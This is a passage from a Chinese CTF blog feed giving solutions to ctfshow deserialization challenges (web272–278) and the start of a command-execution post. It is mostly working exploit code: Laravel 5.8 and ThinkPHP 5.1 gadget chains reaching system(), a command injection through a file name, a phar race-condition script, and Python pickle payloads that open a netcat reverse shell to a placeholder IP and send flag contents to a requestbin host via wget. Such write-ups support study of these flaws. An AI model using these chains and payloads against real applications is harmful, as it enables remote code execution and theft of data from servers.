class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$instances</span> = []</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instances[<span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>] = <span class="variable">$instances</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>(&quot;<span class="title">hello</span>&quot; =&gt; &quot;<span class="title">world</span>&quot;));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$app</span> = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> Illuminate\Foundation\Application(<span class="variable">$app</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<span class="variable">$defaultgenerator</span>, <span class="variable">$application</span>, <span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补充一个脚本！</p><hr /><h2 id="web272-273-laravel5-8反序列化漏洞"><a href="#web272-273-laravel5-8反序列化漏洞" class="headerlink" title="web272~273(laravel5.8反序列化漏洞)"></a>web272~273(laravel5.8反序列化漏洞)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>\<span class="title">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=<span class="keyword">new</span> Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event=<span class="keyword">new</span> QueuedCommand();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>=&quot;<span class="title">ls</span> /&quot;;  <span class="comment">//此处参数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>=&quot;<span class="title">system</span>&quot;;  <span class="comment">//此处函数</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>\<span class="title">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> PendingBroadcast()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr /><h1 id="web274-thinkphp-5-1反序列化漏洞"><a href="#web274-thinkphp-5-1反序列化漏洞" class="headerlink" title="web274(thinkphp 5.1反序列化漏洞)"></a>web274(thinkphp 5.1反序列化漏洞)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;harker&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="keyword">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210418143531631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> filter(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;checkevil()===<span class="literal">false</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        copy(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],md5(mt_rand()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        unlink(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__destruct当对象被销毁时调用，所以我们不需要用到反序列化函数。那么只要$this-&gt;evilfile是true就可以了执行系统命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?fn&#x3D;;cat f*</span><br><span class="line">data:flag&#x3D;123</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210418145347112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile &amp;&amp; <span class="keyword">$this</span>-&gt;admin)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> filter(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;checkevil()===<span class="literal">false</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        copy(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],md5(mt_rand()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        unlink(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里增加了判断$this-&gt;admin，所以我们需要进行反序列化来修改admin的值！，所以可以通过file_put_contents写入php函数，然后通过其进行触发phar反序列化，因此需要进行条件竞争！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">&#x27;http://349162dd-6c8d-4c80-96c2-59fee334418d.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = f.read()</span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work1</span>():</span></span><br><span class="line">    requests.post(url+<span class="string">&quot;?fn=a&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work2</span>():</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    r = requests.post(url+<span class="string">&quot;?fn=phar://phar.phar/&quot;</span>, data=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> flag <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        print(base64.b64encode(r.text.encode()))</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">    a = threading.Thread(target=work1)</span><br><span class="line">    b = threading.Thread(target=work2)</span><br><span class="line">    a.start()</span><br><span class="line">    b.start()</span><br></pre></td></tr></table></figure><p>而cahr里面是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;1|cat f*&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> filter();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>抄了抄大师傅的脚本！</p><hr ><h1 id="web277-278-python反序列化"><a href="#web277-278-python反序列化" class="headerlink" title="web277~278(python反序列化)"></a>web277~278(python反序列化)</h1><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__redure__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;nc xxx.xxx.xxx.xxx 4567 -e /bin/sh&quot;).read()&#x27;</span>,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line">print(base64.b64encode(test))</span><br></pre></td></tr></table></figure><p>又找了个脚本！自己也不懂，不过先找为敬。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RunCmd</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">return</span> (os.system,(<span class="string">&#x27;wget http://requestbin.net/r/duwbu270?a=`cat fla*`&#x27;</span>,))</span><br><span class="line">print(base64.b64encode(pickle.dump(RunCmd())))</span><br></pre></td></tr></table></figure><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1827600686&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow命令执行</title>
      <link href="posts/d6a5c6cb/"/>
      <url>posts/d6a5c6cb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span 